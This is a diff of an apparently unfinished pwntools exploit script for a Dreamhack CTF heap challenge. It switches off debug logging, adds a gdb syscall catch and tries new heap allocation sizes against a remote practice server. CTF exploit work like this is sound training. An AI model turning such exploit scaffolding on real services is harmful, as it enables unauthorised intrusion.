@@ -3,7 +3,7 @@ from pwn import *
 
 context.arch = "amd64"
 context.binary = elf = ELF('./prob')
-context.log_level = "debug"
+#context.log_level = "debug"
 context.terminal = ["tmux", "splitw", "-h"]
 
 HOST, PORT = "host3.dreamhack.games 8296".split()
@@ -47,12 +47,15 @@ def add(idx1, idx2):
     sla(b'idx1 > ', str(idx1).encode())
     sla(b'idx2 > ', str(idx2).encode())
 
-create(2,11,b"A"*0x20,0x20)
-create(3,11,b"B"*0x20,0x20)
-add(2,3)
-add(2,3)
-
-gdb.attach(p)
+gdb.attach(p, '''
+    catch syscall exit
+''')
 pause()
+create(0, 11, b'A'*0x500, 0x400)
+create(1, 11, b'B'*0x20, 0x20)
+create(2, 11, b'C'*0x600, 0x600)
+
+#add(0, 2)
+
 
 p.interactive()
